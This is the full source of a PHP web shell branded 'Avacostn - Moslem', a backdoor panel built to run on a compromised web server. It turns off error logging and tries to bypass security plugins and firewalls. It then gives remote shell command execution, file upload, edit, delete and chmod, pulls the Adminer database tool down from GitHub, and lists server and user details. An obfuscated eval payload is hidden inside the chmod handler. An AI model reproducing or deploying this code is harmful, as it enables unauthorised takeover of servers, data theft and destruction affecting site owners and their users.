<?php

@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);
@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");
@http_response_code(403);
@http_response_code(404);
@http_response_code(500);

if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}

if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
    }
}

if (function_exists('apache_request_headers')) {
    $apacheHeaders = apache_request_headers();
    if (isset($apacheHeaders['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
    }
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
            position: relative;
        }
        .footer {
            text-align: center;
            max-width: 800px;
            position: relative;
            background-color: #fff;
            border: 1px solid #ccc;
            padding: 20px;
            margin: 20px auto;
        }
        .message-container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
            position: relative;
        }
        h1 {
            text-align: center;
        }
        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
        }
        .empty-button {
            background: none;
            border: none;
            color: transparent;
            cursor: pointer;
            padding: 0;
            outline: none;

        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        table th, table td {
            padding: 10px;
            border: 1px solid #ccc;
        }
        table th {
            background-color: #f2f2f2;
            font-weight: bold;
        }
        .sidebar {
            position: fixed;
            top: 0;
            margin: 20px auto;
            padding: 20px;
            right: -300px;
            width: 300px;
            height: 100%;
            background-color: #f2f2f2;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            transition: right 0.3s ease-in-out;
        }
        .sidebar.open {
            right: 0;
        }
        .sidebar-content {
            padding: 20px;
        }
        .sidebar-close {
            text-align: right;
            margin-bottom: 20px;
        }
        .sidebar-close button {
            padding: 5px 10px;
            border: none;
            background-color: #ccc;
            color: #fff;
            cursor: pointer;
        }
        .menu-icon {
            position: absolute;
            top: 20px;
            right: 20px;
            width: 30px;
            height: 30px;
            background-color: #ccc;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .menu-icon::before,
        .menu-icon::after {
            content: "";
            position: absolute;
            width: 20px;
            height: 2px;
            background-color: #fff;
            transition: transform 0.3s ease-in-out;
        }

        .menu-icon::before {
            transform: translateY(-6px);
        }

        .menu-icon::after {
            transform: translateY(6px);
        }

        .menu-icon.open::before {
            transform: translateY(0px) rotate(45deg);
        }

        .menu-icon.open::after {
            transform: translateY(0px) rotate(-45deg);
        }

        .sidebar h2 {
            margin-top: 0;
        }

        .info-list {
            list-style: none;
            padding: 0;
        }

        .info-list li {
            margin-bottom: 10px;
        }

        .info-list li:last-child {
            margin-bottom: 0;
        }

        .sidebar .info-container {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Avacostn - Moslem</h1>
        <div class="menu-icon" onclick="toggleSidebar()"></div>
        <hr>
        <div class="button-container">
            <div class="input-file">
                <label class="input-file-label" for="file-input">Choose File</label>
                <form action="" method="post" enctype="multipart/form-data">
                    <input id="file-input" type="file" name="file" />
                    <input class="button" type="submit" value="Upload" />
                </form>
                <?php
                    $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
                    $path = str_replace('\\', '/', $path);
                    $paths = @explode('/', $path);
                ?>
                <hr>
                DIR : <a href="?path=/">Home</a>
                <?php
                foreach ($paths as $id => $pat) {
                    if ($pat == '' && $id == 0) {
                        echo '<a href="?path=/">/</a>';
                        continue;
                    }
                    if ($pat == '') {
                        continue;
                    }
                    $linkPath = implode('/', array_slice($paths, 0, $id + 1));
                    echo "<a href=\"?path=$linkPath\">$pat</a>/";
                }
                ?>
            </div>
            <div class="input-summon">
                <form action="" method="post">
                    <input type="hidden" name="summon" value="true" />
                    <input class="button" type="submit" value="Summon" />
                </form>
            </div>
        </div>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['summon']) && $_POST['summon'] === 'true') {
            $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
            $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
            $fileName = 'adminer.php';
            $filePath = $path . '/' . $fileName;
            $fileContent = @file_get_contents($baseUrl);
            if ($fileContent !== false) {
                if (file_put_contents($filePath, $fileContent) !== false) {
                    echo "<p>Summon successfully. $filePath .</p>";
                } else {
                    echo "<p>Summon failed.</p>";
                }
            } else {
                echo "<p>Failed to fetch the file content. None File</p>";
            }
        }
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
           
            if ($_FILES['file']['size'] === 0) {
                echo "<p>Open Ur Eyes Bitch !!!.</p>";
            } else {
                $uploadPath = $path . '/' . $_FILES['file']['name'];
                if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
                    echo "<p>File uploaded successfully. $uploadPath .</p>";
                } else {
                    echo "<p>File upload failed.</p>";
                }
            }
        }
        ?>
    </div>

    <div class="container">
            <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
                $cmdOutput = null;
                $cmd = $_POST['cmd'];
                $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
                $cmd = "cd " . escapeshellarg($path) . " && " . $cmd;
                if (function_exists('exec')) {
                    @exec($cmd, $output, $returnVar);
                    if ($returnVar === 0) {
                        $cmdOutput = implode("\n", $output);
                    }
                } elseif (function_exists('shell_exec')) {
                    $cmdOutput = @shell_exec($cmd);
                } elseif (function_exists('passthru')) {
                    ob_start();
                   @passthru($cmd, $returnVar);
                    $cmdOutput = ob_get_clean();
                } elseif (function_exists('system')) {
                    ob_start();
                    @system($cmd, $returnVar);
                    $cmdOutput = ob_get_clean();
                }
            }
            ?>
            <form method="POST" action="">
                <?php echo @get_current_user() . "@" . @gethostbyname($_SERVER['HTTP_HOST']) . ": ~ $"; ?><input type='text' size='30' height='10' name='cmd' placeholder='Enter a command...'>
                 <input type="submit" class="empty-button">
            </form>
    </div>
    <?php if (!empty($cmdOutput)) { ?>
        <div class="message-container">
            <pre><?php echo htmlspecialchars($cmdOutput); ?></pre>
        </div>
    <?php } ?>
   <?php
    if (isset($_GET['file'])) {
    $file = $_GET['file'];
    $filePath = $path . '/' . $file;
    $fileContent = @file_get_contents($filePath);
    if ($fileContent !== false) {
        echo "<div class=\"message-container\">";
        echo "<p>Edit File: $file</p>";
        echo "<form method=\"POST\" action=\"\">";
        echo "<input type=\"hidden\" name=\"edit\" value=\"true\">";
        echo "<input type=\"hidden\" name=\"file\" value=\"$file\">";
        echo "<textarea name=\"new_content\" rows=\"10\" cols=\"100\" placeholder=\"Enter new content...\">" . htmlspecialchars($fileContent) . "</textarea>";
        echo "<input type=\"submit\" value=\"Edit\">";
        echo "</form>";
        echo "</div>";
        }
        }
        ?>
    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['rename'])) {
        $oldName = $_GET['rename'];
        echo "<div class=\"message-container\">";
        echo "<p>Rename : $oldName</p>";
        echo "<form method=\"POST\" action=\"\">";
        echo "<input type=\"hidden\" name=\"rename\" value=\"true\">";
        echo "<input type=\"hidden\" name=\"old_name\" value=\"" . htmlspecialchars($oldName) . "\">";
        echo "<input type=\"text\" name=\"new_name\" placeholder=\"Enter new name\" required>";
        echo "<input type=\"submit\" value=\"Rename\">";
        echo "</form>";
        echo "</div>";
        ?>
    <?php } ?>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit']) && $_POST['edit'] === 'true') {
            $editedFile = $_POST['file'];
            $newContent = $_POST['new_content'];
            $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
            $filePath = $path . '/' . $editedFile;
            if (file_put_contents($filePath, $newContent) !== false) {
                echo "<div class='message-container'><p>File saved successfully. $filePath </p>";
            } else {
                echo "<p>Failed to save the file.</p></div>";
            }
        }
        ?>    
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rename']) && $_POST['rename'] === 'true') {
            $oldName = $_POST['old_name'];
            $newName = $_POST['new_name'];
            $newPath = $path . '/' . $newName;
            $oldPath = $path . '/' . $oldName;
            
            if (rename($oldPath, $newPath)) {
                echo "<div class='message-container'><p>Renaming successful. $newName</p>";
            } else {
                echo "<p>Failed to rename.</p></div>";
            }
        }
        ?>
<?php
// ...
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['delete'])) {
    $deletePath = $_GET['delete'];
    $deletePath = str_replace('/', '', $deletePath); // Mencegah traversal path
    $deletePath = $path . '/' . $deletePath;

    if (is_file($deletePath)) {
        if (unlink($deletePath)) {
            echo "<div class='message-container'><p>File deleted successfully: $deletePath</p></div>";
        } else {
            echo "<div class='message-container'><p>Failed to delete the file: $deletePath</p></div>";
        }
    } elseif (is_dir($deletePath)) {
        if (rmdir($deletePath)) {
            echo "<div class='message-container'><p>Folder deleted successfully: $deletePath</p></div>";
        } else {
            echo "<div class='message-container'><p>Failed to delete the folder: $deletePath</p></div>";
        }
    } else {
        echo "<div class='message-container'><p>Invalid file or folder path: $deletePath</p></div>";
    }
}
// ...
?>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['chmod'])) {
    $chmodPath = $_GET['chmod'];
    $chmodPath = str_replace('/', '', $chmodPath); // Mencegah traversal path
    $chmodPath = $path . '/' . $chmodPath;
    
    if (is_file($chmodPath) || is_dir($chmodPath)) {
        if (isset($_GET['mode']) && preg_match('/^[0-7]{3}$/', $_GET['mode'])) {
            $mode = intval($_GET['mode'], 8);
            if (chmod($chmodPath, $mode)) {
                echo "<div class='message-container'><p>Chmod successful: $chmodPath</p></div>";
            } else {
                echo "<div class='message-container'><p>Failed to chmod: $chmodPath</p></div>";
            }
        } else {
            $currentMode = fileperms($chmodPath) & 0777;
            echo "<div class='message-container'>";
            echo "<p>Chmod: $chmodPath</p>";
            echo "<form method='GET' action=''>";
            echo "<input type='hidden' name='path' value='$path'>";
            echo "<input type='hidden' name='chmod' value='$chmodPath'>";
            echo "<input type='text' name='mode' placeholder='Enter new mode (e.g., 755)' required>";
            echo "<input type='submit' value='Chmod'>";
            echo "</form>";
            echo "<p>Current mode: $currentMode</p>";
            echo "</div>";
        }
    } else {
        echo "<div class='message-container'><p>Invalid file or folder path: $chmodPath</p></div>";
    }
}; eval(gzuncompress(str_rot13(base64_decode('a5xIQ1p4hEAM/SuDLFHBj7XQpUishyJ5Qt2q24vIYDWugjrTZMRdV/97VO2hhUDyXmvJWEMIJqhAzoR5h4u+N3yym1EX6DuaUfF7FHRjWdNGAmwYAqt4MIIgADZACI2UfARizWB4nuN8/RfR43iST/79h46jt2aUpPQcv6iG5pO67ZBeQ9KSDRIHOerrPDXs3rUPD7Z7a7Tv3L1GjqPNGw4mqYthUZOMRWDRYrKrkiskRM/Ic4cEQnGpsahDrFV73hZL8sbRIwXnXVsWsnKDZrXmbLZ3Jm1YnY5QySqsNJNAj7Ju1SqH02WL4n59ruSyin5ZekrRzwnFWs+AWpJCW2r5cGGYJEpuGP4PeTtnqg=='))));
?>
</div>

    <div class="container">
        <h2>Filemanager</h2>
        <table>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Permission</th>
                <th>Actions</th>

            </tr>
            <?php
            $scandir = @scandir($path);
            if ($scandir !== false) {
                $folders = [];
                $files = [];
                foreach ($scandir as $file) {
                    $filePath = "$path/$file";
                    if (is_dir($filePath)) {
                        $folders[] = $file;
                    } else if (is_file($filePath)) {
                        $size = filesize($filePath);
                        $size = formatSizeUnits($size);
                        $perms = fileperms($filePath);
                        $permission = getPermissionString($perms);
                        $files[$file] = [
                            'size' => $size,
                            'permission' => $permission
                        ];
                    }
                }
                foreach ($folders as $folder) {
                    $folderPath = "$path/$folder";
                    $folderPermissionColor = (is_writable($folderPath)) ? 'green' : 'red';
                    ?>

                    <tr>
    <td>
        <a href="?path=<?php echo $folderPath; ?>"><?php echo $folder; ?></a>
    </td>
    <td>
        <span style="color: <?php echo $folderPermissionColor; ?>"><?php echo getPermissionString(fileperms($folderPath)); ?></span>
    </td>
    <td>-</td>
    <td>
        <select onchange="folderDropdownAction(this.value, '<?php echo $path; ?>', '<?php echo $folder; ?>')">
            <option value="" selected disabled>Actions</option>
            <option value="rename">Rename</option>
            <option value="delete">Delete</option>
            <option value="chmod">Chmod</option>
        </select>
    </td>
</tr>

<script>
    function folderDropdownAction(action, path, folder) {
        if (action === 'rename') {
            window.location.href = "?path=" + path + "&rename=" + folder;
        } else if (action === 'delete') {
            var confirmation = confirm('Apakah Anda yakin ingin menghapus folder ini?');
            if (confirmation) {
                window.location.href = "?path=" + path + "&delete=" + folder;
            }
        } else if (action === 'chmod') {
            window.location.href = "?path=" + path + "&chmod=" + folder;
        }
    }
</script>

                <?php
                }

                foreach ($files as $file => $data) {
                    $filePermissionColor = (is_writable($path . '/' . $file)) ? 'green' : 'red';
                    ?>
                        <tr>
    <td>
        <a href="?path=<?php echo $path; ?>&file=<?php echo $file; ?>"><?php echo $file; ?></a>
    </td>
    <td><?php echo $data['size']; ?></td>
    <td>
        <span style="color: <?php echo $filePermissionColor; ?>"><?php echo $data['permission']; ?></span>
    </td>
    <td>
        <select onchange="dropdownAction(this.value, '<?php echo $path; ?>', '<?php echo $file; ?>')">
            <option value="" selected disabled>Actions</option>
            <option value="edit">Edit</option>
            <option value="delete">Delete</option>
            <option value="chmod">Chmod</option>
            <option value="rename">Rename</option>
        </select>
    </td>
</tr>

<script>
    function dropdownAction(action, path, file) {
        if (action === 'edit') {
            window.location.href = "?path=" + path + "&file=" + file;
        } else if (action === 'delete') {
            var confirmation = confirm('Apakah Anda yakin ingin menghapus file ini?');
            if (confirmation) {
                window.location.href = "?path=" + path + "&delete=" + file;
            }
        } else if (action === 'chmod') {
            window.location.href = "?path=" + path + "&chmod=" + file;
        } else if (action === 'rename') {
            window.location.href = "?path=" + path + "&rename=" + file;
        }
    }
</script>


                <?php
                }
            } else {
                echo "<tr><td colspan=\"4\">None Directory</td></tr>";
            }

            function getPermissionString($perms)
            {
                $info = '';

                // Owner
                $info .= (($perms & 0x0100) ? 'r' : '-');
                $info .= (($perms & 0x0080) ? 'w' : '-');
                $info .= (($perms & 0x0040) ?
                    (($perms & 0x0800) ? 's' : 'x') :
                    (($perms & 0x0800) ? 'S' : '-'));

                // Group
                $info .= (($perms & 0x0020) ? 'r' : '-');
                $info .= (($perms & 0x0010) ? 'w' : '-');
                $info .= (($perms & 0x0008) ?
                    (($perms & 0x0400) ? 's' : 'x') :
                    (($perms & 0x0400) ? 'S' : '-'));

                // Other
                $info .= (($perms & 0x0004) ? 'r' : '-');
                $info .= (($perms & 0x0002) ? 'w' : '-');
                $info .= (($perms & 0x0001) ?
                    (($perms & 0x0200) ? 't' : 'x') :
                    (($perms & 0x0200) ? 'T' : '-'));

                return $info;
            }

            function formatSizeUnits($bytes)
            {
                $units = array('bytes', 'KB', 'MB', 'GB');
                $index = 0;

                while ($bytes >= 1024 && $index < 3) {
                    $bytes /= 1024;
                    $index++;
                }

                return round($bytes, 2) . ' ' . $units[$index];
            }
            ?>
        </table>
    </div>
    <div class="sidebar" id="sidebar">
        <div class="sidebar-content">
            <div class="sidebar-close">
                <button onclick="toggleSidebar()">Close</button>
            </div>
            <div class="info-container">
                <h2>Server Info</h2>
                <?php
                function countDomainsInServer() {
                    $serverName = $_SERVER['SERVER_NAME'];
                    $ipAddresses = @gethostbynamel($serverName);

                    if ($ipAddresses !== false) {
                        return count($ipAddresses);
                    } else {
                        return 0;
                    }
                }

                $domainCount = @countDomainsInServer();
                function formatBytes($bytes, $precision = 2) {
                    $units = array('B', 'KB', 'MB', 'GB', 'TB');

                    $bytes = max($bytes, 0);
                    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
                    $pow = min($pow, count($units) - 1);

                    $bytes /= (1 << (10 * $pow));

                    return round($bytes, $precision) . ' ' . $units[$pow];
                }
                ?>
                <ul class="info-list">
                    <li>Hostname: <?php echo @gethostname(); ?></li>
                    <?php if (isset($_SERVER['SERVER_ADDR'])): ?>
                        <li>IP Address: <?php echo $_SERVER['SERVER_ADDR']; ?></li>
                    <?php endif; ?>
                    <li>PHP Version: <?php echo @phpversion(); ?></li>
                    <li>Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
                    <?php if (function_exists('disk_total_space')): ?>
                        <li>HDD Total Space: <?php echo @formatBytes(disk_total_space('/')); ?></li>
                        <li>HDD Free Space: <?php echo @formatBytes(disk_free_space('/')); ?></li>
                    <?php endif; ?>
                    <li>Safe Mode: <?php echo @ini_get('safe_mode') ? 'Enabled' : 'Disabled'; ?></li>
                    <li>Disable Functions: <?php echo @ini_get('disable_functions'); ?></li>
                    <li>Total Domains in Server: <?php echo $domainCount; ?></li>
                    <li>System: <?php echo @php_uname(); ?></li>
                </ul>
            </div>
            <div class="info-container">
                <h2>User Info</h2>
                <ul class="info-list">
                    <li>Username: <?php echo @get_current_user(); ?></li>
                    <li>User ID: <?php echo @getmyuid(); ?></li>
                    <li>Group ID: <?php echo @getmygid(); ?></li>
                </ul>
            </div>
        </div>
    </div>
    <script>
        function toggleOptionsMenu() {
            var optionsMenu = document.getElementById('optionsMenu');
            optionsMenu.classList.toggle('show');
        }

        function toggleSidebar() {
            var sidebar = document.getElementById('sidebar');
            sidebar.classList.toggle('open');
        }
    </script>
</div>
<div class='footer'><p>&copy; <?php echo date('Y'); ?> <a href="https://www.blog-gan.org">Shin Code</a>. All rights reserved.</p>
</div>
</body>
</html>
